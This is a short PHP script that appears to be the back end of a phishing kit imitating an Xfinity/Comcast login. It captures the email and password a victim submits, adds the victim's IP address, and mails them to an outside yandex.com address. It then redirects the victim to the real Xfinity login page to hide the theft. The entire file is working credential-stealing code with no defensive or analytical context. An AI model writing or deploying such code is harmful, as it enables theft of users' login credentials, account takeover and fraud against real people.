<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || coinbxe log GOD 1ST SON || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "Pass: ".$_POST['formtext2']."\n";
$message .= "----: || THANKS BE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="link3dinresult@yandex.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://login.xfinity.com/login?r=comcast.net&s=oauth&continue=https%3A%2F%2Foauth.xfinity.com%2Foauth%2Fauthorize%3Fclient_id%3Dmy-account-web%26prompt%3Dlogin%26redirect_uri%3Dhttps%253A%252F%252Fcustomer.xfinity.com%252Foauth%252Fcallback%26response_type%3Dcode%26state%3D%2523%252F%26response%3D1&forceAuthn=1&client_id=my-account-web&reqId=4f287a6e-c833-445f-8262-7422ec3bff10&fbclid=IwAR3QK06GBx5anX3-9TSJ5IwmiKDNCquTzfxHj8hopYi0K-WjK47ROMSGz5Y");
?>